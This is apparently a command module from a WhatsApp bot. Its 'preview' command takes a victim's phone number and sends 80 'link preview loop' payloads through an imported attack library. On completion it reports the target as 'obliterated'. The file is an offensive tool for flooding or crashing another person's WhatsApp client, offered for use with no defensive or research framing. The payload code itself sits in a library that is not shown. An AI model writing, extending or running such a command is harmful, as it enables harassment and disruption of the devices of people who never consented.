'use strict';
const { MadaraEye } = require('../../lib/madaraEye');
const { createProgressBar } = require('../../lib/progressBar');

module.exports = {
    name: 'preview',
    aliases: ['linkpreview', 'previewloop'],
    category: 'madaraeye',
    desc: 'ʟɪɴᴋ ᴘʀᴇᴠɪᴇᴡ ʟᴏᴏᴘ — ᴍᴀx ᴀɢɢʀᴇssɪᴠᴇ',
    usage: '.preview <number>',
    waitReact: true,

    async execute(sock, msg, args, ctx) {
        const s = ctx.settings;
        const prefix = s.prefix || '.';
        
        if (!args[0]) {
            return sock.sendMessage(ctx.from, { 
                text: `❌ *ᴡʀᴏɴɢ ᴜsᴀɢᴇ*\n\n📌 *Usage:* ${prefix}preview <number>\n📝 *Example:* ${prefix}preview 2348012345678` 
            }, { quoted: msg });
        }
        
        const target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        
        let eye = global.getMadaraEye?.(sock);
        if (!eye) {
            eye = new MadaraEye(sock);
        }
        
        const TOTAL = 80;
        const bar = createProgressBar(sock, ctx.from, TOTAL, msg);
        
        try {
            for (let i = 0; i < TOTAL; i++) {
                await eye.linkPreviewLoop(target, msg);
                await bar.update(1, 'ʟɪɴᴋ ᴘʀᴇᴠɪᴇᴡ');
                if (i % 10 === 0) await new Promise(r => setTimeout(r, 150));
            }
            
            await bar.done(`✅ ᴘʀᴇᴠɪᴇᴡ ʟᴏᴏᴘ ᴄᴏᴍᴘʟᴇᴛᴇ\n💀 ᴛᴀʀɢᴇᴛ ᴏʙʟɪᴛᴇʀᴀᴛᴇᴅ\n📊 ᴛᴏᴛᴀʟ ᴘᴀʏʟᴏᴀᴅs: ${TOTAL}\n🎯 ᴛᴀʀɢᴇᴛ: ${target}`);
        } catch (e) {
            await bar.done(`❌ ᴇʀʀᴏʀ: ${e.message}`);
        }
    }
};